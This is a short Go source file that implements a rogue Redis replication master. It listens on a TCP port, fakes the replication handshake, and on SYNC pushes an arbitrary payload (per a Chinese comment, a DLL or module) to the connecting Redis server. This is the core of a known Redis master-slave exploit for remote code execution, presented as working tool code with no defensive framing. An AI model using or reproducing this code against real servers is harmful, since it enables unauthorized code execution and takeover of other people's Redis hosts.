package pkg

import (
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
)

// Listen 开启TCP端口
func Listen(lhost, lport string, payload []byte) error {

	addr := fmt.Sprintf("%v:%v", lhost, lport)
	//fmt.Println(addr)

	var wg sync.WaitGroup
	wg.Add(1)

	tcpAddr, err := net.ResolveTCPAddr("tcp", addr)
	if err != nil {
		return err
	}

	tcpListen, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		return err
	}

	defer tcpListen.Close()

	c, err := tcpListen.AcceptTCP()
	if err != nil {
		return err
	}
	//logger.Info(c.RemoteAddr().String())

	go sendCmd(payload, &wg, c)
	wg.Wait()

	c.Close()

	return nil
}

// 读取dll进行主从
func sendCmd(payload []byte, wg *sync.WaitGroup, c *net.TCPConn) {

	defer wg.Done()

	buf := make([]byte, 1024)
	for {
		n, err := c.Read(buf)
		if err == io.EOF {
			return
		}

		if err != nil {
			return
		}

		switch {
		case strings.Contains(string(buf[:n]), "PING"):
			c.Write([]byte("+PONG\r\n"))

		case strings.Contains(string(buf[:n]), "REPLCONF"):
			c.Write([]byte("+OK\r\n"))

		case strings.Contains(string(buf[:n]), "SYNC"):
			resp := "+FULLRESYNC " + "0000000000000000000000000000000000000000" + " 1" + "\r\n"
			resp += "$" + fmt.Sprintf("%v", len(payload)) + "\r\n"
			respb := []byte(resp)
			respb = append(respb, payload...)
			respb = append(respb, []byte("\r\n")...)
			c.Write(respb)
		}
	}
}
